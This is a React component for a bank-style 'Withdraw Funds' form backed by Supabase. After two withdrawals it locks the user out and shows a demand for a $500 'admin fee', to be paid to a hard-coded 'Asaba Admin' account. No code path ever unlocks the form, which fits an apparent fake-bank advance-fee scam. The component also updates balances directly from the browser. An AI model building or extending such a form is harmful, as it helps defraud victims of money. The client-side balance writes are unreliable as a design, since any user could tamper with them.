import { useState } from 'react';
import { useSupabaseClient } from '@supabase/auth-helpers-react';
import RecipientManager from './RecipientManager';

interface Props {
  userId: string;
  userEmail: string;
  withdrawalCount: number;
  checkingBalance: number;
  savingsBalance: number;
  onSuccess?: (summary: {
    amount: number;
    bankName: string;
    routingNumber: string;
    accountNumber: string;
    transferType: string;
  }) => void;
  onError?: (message: string) => void;
}

export default function WithdrawalForm({
  userId,
  userEmail,
  withdrawalCount,
  checkingBalance,
  savingsBalance,
  onSuccess,
  onError,
}: Props) {
  const supabase = useSupabaseClient();
  const [accountType, setAccountType] = useState<'Checking' | 'Savings'>('Checking');
  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState<'ACH' | 'Wire'>('ACH');
  const [form, setForm] = useState({
    bankName: '',
    routingNumber: '',
    accountNumber: '',
    accountName: '',
    swiftCode: '',
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [feePaid, setFeePaid] = useState(false);

  const isFinalWithdrawal = withdrawalCount >= 2;
  const disabled = isFinalWithdrawal && !feePaid;
  const balance = accountType === 'Checking' ? checkingBalance : savingsBalance;
  const formattedBalance = balance.toFixed(2);

  const handleRecipientSelect = (recipient: any) => {
    setForm({
      bankName: recipient.bank_name,
      routingNumber: recipient.routing_number,
      accountNumber: recipient.account_number,
      accountName: recipient.name,
      swiftCode: recipient.swift_code || '',
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (disabled) return;

    const amt = parseFloat(amount);
    if (isNaN(amt) || amt <= 0) {
      setError('Please enter a valid amount');
      return;
    }

    if (amt > balance) {
      setError('Insufficient funds');
      return;
    }

    setLoading(true);

    try {
      const { error: insertError } = await supabase.from('withdrawals').insert([
        {
          user_id: userId,
          email: userEmail,
          account_type: accountType,
          amount: amt,
          method,
          bank_name: form.bankName,
          routing_number: form.routingNumber,
          account_number: form.accountNumber,
          account_name: form.accountName,
          swift_code: form.swiftCode,
          status: 'pending',
        },
      ]);

      if (insertError) throw insertError;

      // Update balances in accounts and profiles tables
      try {
        const { error: accountsError } = await supabase
          .from('accounts')
          .update({ balance: balance - amt })
          .eq('user_id', userId)
          .eq('type', accountType);

        if (accountsError) {
          console.error('Accounts update error:', accountsError);
          throw new Error('Failed to update account balance');
        }

        const { error: profilesError } = await supabase
          .from('profiles')
          .update({
            checking_balance: accountType === 'Checking' ? checkingBalance - amt : checkingBalance,
            savings_balance: accountType === 'Savings' ? savingsBalance - amt : savingsBalance,
          })
          .eq('id', userId);

        if (profilesError) {
          console.error('Profiles update error:', profilesError);
          throw new Error('Failed to update profiles balance');
        }
      } catch (err) {
        console.error('Error updating balances:', err);
        throw new Error('Failed to update balances');
      }

      // Update withdrawal count in profiles
      const { error: profileError } = await supabase
        .from('profiles')
        .update({ withdrawal_count: withdrawalCount + 1 })
        .eq('id', userId);

      if (profileError) {
        console.error('Error updating withdrawal count:', profileError);
        throw new Error('Failed to update withdrawal count');
      }

      setAmount('');
      setForm({
        bankName: '',
        routingNumber: '',
        accountNumber: '',
        accountName: '',
        swiftCode: '',
      });

      onSuccess?.({
        amount: amt,
        bankName: form.bankName,
        routingNumber: form.routingNumber,
        accountNumber: form.accountNumber,
        transferType: method,
      });
    } catch (err) {
      console.error('Withdrawal error:', err);
      onError?.('Failed to process withdrawal. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-white p-6 rounded shadow-md">
      <h2 className="text-xl font-semibold mb-4 text-indigo-800">Withdraw Funds</h2>

      {error && (
        <div className="bg-red-50 border-l-4 border-red-400 p-4 mb-4">
          <p className="text-red-700">{error}</p>
        </div>
      )}

      {isFinalWithdrawal && !feePaid ? (
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
          <p className="text-yellow-700 font-medium">Admin Fee Required</p>
          <p className="text-sm">
            You have reached the withdrawal limit. Pay the $500 fee to unlock further withdrawals.
          </p>
          <div className="mt-2 text-sm">
            <p>
              <strong>Account Name:</strong> Asaba Admin
            </p>
            <p>
              <strong>Account Number:</strong> 9876-5432-2100
            </p>
            <p>
              <strong>Bank Name:</strong> Asaba National Bank
            </p>
            <p>
              <strong>Routing Number:</strong> 021000021
            </p>
            <p>
              <strong>SWIFT Code:</strong> ASBNUS33
            </p>
            <p>
              <strong>Support Email:</strong> support@asababank.com
            </p>
          </div>
        </div>
      ) : null}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block font-medium mb-2">Account Type</label>
          <select
            className="w-full p-2 border rounded"
            value={accountType}
            onChange={(e) => setAccountType(e.target.value as 'Checking' | 'Savings')}
            disabled={disabled}
          >
            <option value="Checking">Checking Account</option>
            <option value="Savings">Savings Account</option>
          </select>
          <p className="mt-1 text-sm text-gray-500">Available balance: ${formattedBalance}</p>
        </div>

        <div>
          <label className="block font-medium mb-2">Amount ($)</label>
          <input
            type="number"
            step="0.01"
            className="w-full p-2 border rounded"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            disabled={disabled}
          />
        </div>

        <div>
          <label className="block font-medium mb-2">Method</label>
          <select
            className="w-full p-2 border rounded"
            value={method}
            onChange={(e) => setMethod(e.target.value as 'ACH' | 'Wire')}
            disabled={disabled}
          >
            <option value="ACH">ACH Transfer</option>
            <option value="Wire">Wire Transfer</option>
          </select>
        </div>

        <RecipientManager userId={userId} onChange={handleRecipientSelect} />

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <input
            placeholder="Bank Name"
            className="p-2 border rounded"
            value={form.bankName}
            readOnly
          />
          <input
            placeholder="Routing Number"
            className="p-2 border rounded"
            value={form.routingNumber}
            readOnly
          />
          <input
            placeholder="Account Number"
            className="p-2 border rounded"
            value={form.accountNumber}
            readOnly
          />
          <input
            placeholder="Account Name"
            className="p-2 border rounded"
            value={form.accountName}
            readOnly
          />
          {method === 'Wire' && (
            <input
              placeholder="SWIFT Code"
              className="p-2 border rounded col-span-full"
              value={form.swiftCode}
              readOnly
            />
          )}
        </div>

        <button
          type="submit"
          disabled={loading || disabled}
          className={`w-full p-3 rounded text-white font-semibold ${
            loading || disabled
              ? 'bg-gray-400 cursor-not-allowed'
              : 'bg-indigo-600 hover:bg-indigo-700'
          }`}
        >
          {loading ? 'Processing...' : 'Submit Withdrawal'}
        </button>
      </form>
    </div>
  );
}
